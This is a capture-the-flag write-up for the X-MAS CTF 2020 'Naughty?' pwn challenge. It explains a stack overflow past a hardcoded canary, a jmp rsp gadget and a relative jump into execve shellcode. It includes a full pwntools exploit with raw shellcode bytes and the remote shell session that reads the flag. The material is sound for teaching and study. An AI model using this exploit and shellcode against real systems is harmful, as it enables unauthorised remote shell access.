# X-MAS CTF 2020

## Naughty?

> ??
>
> You haven't been naughty, have you?
>
> Target: `nc challs.xmas.htsp.ro 2000`
> 
> Author: Th3R4nd0m
> 
> [naughty.zip](naughty.zip)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _shellcode_ _remote-shell_


## Summary

Constrained space shellcode exploit triggered with a relative jump--_naughty_.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

No mitigations in place.  Choose your own adventure.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  char local_38 [46];
  short local_a;
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  local_a = -0x1b01;
  puts("Tell Santa what you want for XMAS");
  fgets(local_38,0x47,stdin);
  puts("Nice. Hope you haven\'t been naughty");
  if (local_a != -0x1b01) {
    puts("Oh no....no gifts for you this year :((");
    exit(0);
  }
  return 0;
}
```

Vulnerability `fgets(local_38,0x47,stdin)` is writing up to `0x47` bytes into a `46` byte buffer that is `0x38` (`local_38`) bytes from the return address.  Along they way `local_a` must be set to `-0x1b01`--_think hardcoded canary_.

To overflow the return address we'll have to send `0x38 - 0xa` (46) bytes of garbage followed by the 2 bytes `-0x1b01` to pass the check, followed by `0x38 - (0x38 - 0xa) - 2` (8) more bytes of garbage.  The total payload to get to the return address should be `0x38` (56) bytes in length.

`fgets` reads one less than size (`0x47`) giving a max ROP overflow of `0x46 - 0x38` (14) bytes.  That's only enough space for one ROP call (well, two ROP calls since (as of this writing) x86_64 addresses are 48-bits (6 bytes)).  And there's no easy `win` function.

Given NX is disabled that natural place to write shellcode would be in `local_38`, as long as that code fits within 46 bytes (easy).

_But how do we call it?_

Simpler challenges like this conveniently leave `rax` pointing to the buffer and a simple `call rax` or `jmp rax` gadget can be used, however setting a checkpoint at `leave` and examining the registers illustrates we're on our own:

```
➜ 20.04 naughty # gef chall
Reading symbols from chall...
(No debugging symbols found in chall)
GEF for linux ready, type `gef' to start, `gef config' to configure
80 commands loaded for GDB 9.2 using Python engine 3.8
gef➤  b *0x4006d4
Breakpoint 1 at 0x4006d4
gef➤  run
Starting program: /pwd/datajerk/xmasctf2020/naughty/chall
Tell Santa what you want for XMAS
flags
```

After the break:

```
$rax   : 0x0
$rbx   : 0x00000000004006e0  →   push r15
$rcx   : 0x00007ffff7ed21e7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffe360  →  0x00000a7367616c66 ("flags\n"?)
$rbp   : 0x00007fffffffe390  →  0x0000000000000000
$rsi   : 0x00007ffff7fad723  →  0xfaf4c0000000000a
$rdi   : 0x00007ffff7faf4c0  →  0x0000000000000000
$rip   : 0x00000000004006d4  →   leave
$r8    : 0x24
$r9    : 0x0
$r10   : 0x00007ffff7fef320  →   pxor xmm0, xmm0
$r11   : 0x246
$r12   : 0x0000000000400550  →   xor ebp, ebp
$r13   : 0x00007fffffffe480  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
```

However, `rsp` is pointing at our input (`flags`), _why not `jmp rsp`?_

Well, `si` once and you'll see that `leave` just _left_ you hanging:

```
$rax   : 0x0
$rbx   : 0x00000000004006e0  →   push r15
$rcx   : 0x00007ffff7ed21e7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffe398  →  0x00007ffff7de80b3  →  <__libc_start_main+243> mov edi, eax
```

`rsp` now pointing to back to libc.  This will be popped into `rip` (we didn't overwrite the return address yet).

If we overwrite the return address with a `jmp rsp` gadget, that call will be popped off the stack and `rsp` pointed to the next down stack line (our last 6 bytes), then `rip` will be pointing to the `jmp rsp` gadget.  So, that leaves us (14 - 8 (for the `jmp rsp`)) 6 bytes for our shellcode.

There's not a lot you can do with 6 bytes but perhaps `jmp` someplace else (I could be wrong), in any case, we only need 2 bytes to relatively jump back `0x40` (`0x38` + 8 for the `jmp rsp` gadget) bytes to the start of `local_38` where we can easily fit some shellcode.

> As I write this I'm wondering if there is an easier ROP chain of 2 gadgets, but nothing is coming to mind.  When I worked on this I did some bad mental math and thought I only had `4` bytes to work with, so assumed `jmp rsp`, then some type stack pivot or relative jump in assembly.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall')
context.log_level = 'INFO'

if args.REMOTE:
    p = remote('challs.xmas.htsp.ro', 2000)
else:
    p = process(binary.path)

# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode  = b''
shellcode += b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf'
shellcode += b'\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54'
shellcode += b'\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

jmp_rsp = list(binary.search(asm('jmp rsp')))[0]

```

`ropper --file chall` reveals there's a `jmp rsp` gadget, so after finding online some shellcode <= 46 bytes in length, we just need to find the location of the `jmp rsp` gadget within `chall`, and since `chall` has no PIE, there's no need to leak a base process address.

```python
payload  = b''
payload += shellcode
payload += (0x38 - 0xa - len(payload)) * b'A'
payload += p16(0x10000 - 0x1b01)
payload += (0x38 - len(payload)) * b'A'
payload += p64(jmp_rsp)
payload += asm('jmp $-0x40')

p.sendlineafter('for XMAS\n', payload)
p.interactive()
```

The payload is basically as described in the analysis section above:

1. write out shellcode
2. pad out to stack offset `0xa`
3. write out the 2-byte _faux_ hardcoded canary `-0x1b01`
4. pad out to the return adddress
5. call the `jmp rsp` gadget, that will then just execute the assembly below it
6. add a 2 bytes of assembly that `jmp` relative back `0x40` bytes to our shellcode

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/xmasctf2020/naughty/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to challs.xmas.htsp.ro on port 2000: Done
[*] Switching to interactive mode
Nice. Hope you haven't been naughty
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /home/ctf/flag.txt
X-MAS{sant4_w1ll_f0rg1ve_y0u_th1s_y3ar}
```

